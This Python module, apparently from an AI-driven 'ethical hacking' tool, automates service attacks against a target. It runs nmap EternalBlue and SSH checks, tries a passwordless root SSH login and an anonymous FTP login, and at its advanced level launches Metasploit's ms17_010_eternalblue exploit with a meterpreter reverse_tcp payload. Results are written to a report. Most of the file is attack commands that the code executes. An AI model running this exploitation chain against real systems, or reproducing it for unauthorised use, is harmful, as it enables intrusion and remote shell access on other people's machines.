"""
Service Exploit Module

This module handles service exploitation (SMB, SSH, FTP, etc.) for the AI-powered ethical hacking tool.
"""

import subprocess
import os
from modules import report_utils

def run(target, report_path=None, level='basic'):
    """Run service exploitation at the specified level and append results as a section in the unified report."""
    if report_path is None:
        report_path = report_utils.get_report_name(cve_id=None)
    report_utils.init_report(report_path, target)
    print(f"[ServiceExploit] Running service exploitation on: {target} (level: {level})")
    findings = {}
    commands = []
    notable = []
    recommendations = []
    raw_output = {}

    # --- BASIC LEVEL ---
    methodology = [
        "Performed basic service exploitation using common vulnerabilities and default exploits.",
    ]
    
    # SMB exploitation (EternalBlue, etc.)
    smb_exploit_cmd = ['nmap', '--script', 'smb-vuln-ms17-010', target]
    try:
        smb_exploit_out = subprocess.check_output(smb_exploit_cmd, stderr=subprocess.STDOUT, text=True)
        findings['smb_eternalblue'] = smb_exploit_out
        raw_output['smb_eternalblue'] = smb_exploit_out
        commands.append(' '.join(smb_exploit_cmd))
        if 'VULNERABLE' in smb_exploit_out:
            notable.append("SMB EternalBlue vulnerability detected.")
    except Exception as e:
        findings['smb_eternalblue'] = f"Error: {e}"
        raw_output['smb_eternalblue'] = str(e)

    # SSH key-based attacks
    ssh_key_test_cmd = ['ssh', '-o', 'ConnectTimeout=5', '-o', 'BatchMode=yes', f'root@{target}']
    try:
        ssh_key_test_out = subprocess.run(ssh_key_test_cmd, capture_output=True, text=True, timeout=10)
        findings['ssh_key_test'] = ssh_key_test_out.stdout + ssh_key_test_out.stderr
        raw_output['ssh_key_test'] = ssh_key_test_out.stdout + ssh_key_test_out.stderr
        commands.append(' '.join(ssh_key_test_cmd))
        if ssh_key_test_out.returncode == 0:
            notable.append("SSH key-based authentication successful.")
    except Exception as e:
        findings['ssh_key_test'] = f"Error: {e}"
        raw_output['ssh_key_test'] = str(e)

    # --- INTERMEDIATE LEVEL ---
    if level in ['intermediate', 'advanced']:
        methodology.append("Added Metasploit framework for automated exploitation and advanced service attacks.")
        
        # Metasploit SMB scan
        msf_smb_cmd = ['msfconsole', '-q', '-x', f'use auxiliary/scanner/smb/smb_version; set RHOSTS {target}; run; exit']
        try:
            msf_smb_out = subprocess.check_output(msf_smb_cmd, stderr=subprocess.STDOUT, text=True, timeout=300)
            findings['msf_smb_scan'] = msf_smb_out
            raw_output['msf_smb_scan'] = msf_smb_out
            commands.append(' '.join(msf_smb_cmd))
            if 'Windows' in msf_smb_out or 'SMB' in msf_smb_out:
                notable.append("Metasploit SMB scan completed successfully.")
        except Exception as e:
            findings['msf_smb_scan'] = f"Error: {e}"
            raw_output['msf_smb_scan'] = str(e)

        # FTP anonymous access
        ftp_anon_cmd = ['ftp', '-n', target]
        try:
            ftp_anon_out = subprocess.run(ftp_anon_cmd, input='user anonymous\npass anonymous@\nquit\n', 
                                        capture_output=True, text=True, timeout=30)
            findings['ftp_anonymous'] = ftp_anon_out.stdout + ftp_anon_out.stderr
            raw_output['ftp_anonymous'] = ftp_anon_out.stdout + ftp_anon_out.stderr
            commands.append(' '.join(ftp_anon_cmd))
            if '230' in ftp_anon_out.stdout:
                notable.append("FTP anonymous access successful.")
        except Exception as e:
            findings['ftp_anonymous'] = f"Error: {e}"
            raw_output['ftp_anonymous'] = str(e)

        # SSH weak algorithms
        ssh_weak_cmd = ['nmap', '--script', 'ssh2-enum-algos', '-p', '22', target]
        try:
            ssh_weak_out = subprocess.check_output(ssh_weak_cmd, stderr=subprocess.STDOUT, text=True)
            findings['ssh_weak_algorithms'] = ssh_weak_out
            raw_output['ssh_weak_algorithms'] = ssh_weak_out
            commands.append(' '.join(ssh_weak_cmd))
            if 'md5' in ssh_weak_out.lower() or 'des' in ssh_weak_out.lower():
                notable.append("SSH weak algorithms detected.")
        except Exception as e:
            findings['ssh_weak_algorithms'] = f"Error: {e}"
            raw_output['ssh_weak_algorithms'] = str(e)

    # --- ADVANCED LEVEL ---
    if level == 'advanced':
        methodology.append("Added advanced exploitation techniques including custom payloads and privilege escalation.")
        
        # Metasploit advanced exploitation
        msf_exploit_cmd = ['msfconsole', '-q', '-x', f'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit']
        try:
            msf_exploit_out = subprocess.check_output(msf_exploit_cmd, stderr=subprocess.STDOUT, text=True, timeout=600)
            findings['msf_eternalblue_exploit'] = msf_exploit_out
            raw_output['msf_eternalblue_exploit'] = msf_exploit_out
            commands.append(' '.join(msf_exploit_cmd))
            if 'session' in msf_exploit_out.lower():
                notable.append("Metasploit EternalBlue exploitation successful.")
        except Exception as e:
            findings['msf_eternalblue_exploit'] = f"Error: {e}"
            raw_output['msf_eternalblue_exploit'] = str(e)

        # Custom SMB exploit (example)
        custom_smb_cmd = ['python3', '-c', f'import socket; s=socket.socket(); s.connect(("{target}", 445)); print("SMB connection test")']
        try:
            custom_smb_out = subprocess.check_output(custom_smb_cmd, stderr=subprocess.STDOUT, text=True)
            findings['custom_smb_test'] = custom_smb_out
            raw_output['custom_smb_test'] = custom_smb_out
            commands.append(' '.join(custom_smb_cmd))
            if 'SMB connection test' in custom_smb_out:
                notable.append("Custom SMB connection test successful.")
        except Exception as e:
            findings['custom_smb_test'] = f"Error: {e}"
            raw_output['custom_smb_test'] = str(e)

        # SSH key generation and deployment
        ssh_keygen_cmd = ['ssh-keygen', '-t', 'rsa', '-b', '4096', '-f', '/tmp/test_key', '-N', '']
        try:
            ssh_keygen_out = subprocess.check_output(ssh_keygen_cmd, stderr=subprocess.STDOUT, text=True)
            findings['ssh_keygen'] = ssh_keygen_out
            raw_output['ssh_keygen'] = ssh_keygen_out
            commands.append(' '.join(ssh_keygen_cmd))
            notable.append("SSH key generated for testing.")
        except Exception as e:
            findings['ssh_keygen'] = f"Error: {e}"
            raw_output['ssh_keygen'] = str(e)

    # Recommendations
    recommendations.append("Patch vulnerable services and disable unnecessary ones.")
    if level in ['intermediate', 'advanced']:
        recommendations.append("Implement strong authentication and access controls.")
    if level == 'advanced':
        recommendations.append("Use advanced monitoring and intrusion detection systems.")

    report_utils.append_section(
        report_path,
        section_title=f"Service Exploitation ({level.title()})",
        methodology='\n'.join(methodology),
        commands=commands,
        findings=findings,
        notable=notable,
        recommendations=recommendations,
        raw_output=raw_output
    )
    return {
        "status": "success",
        "target": target,
        "report": report_path,
        "findings": findings,
        "notable": notable,
        "recommendations": recommendations,
        "level": level
    } 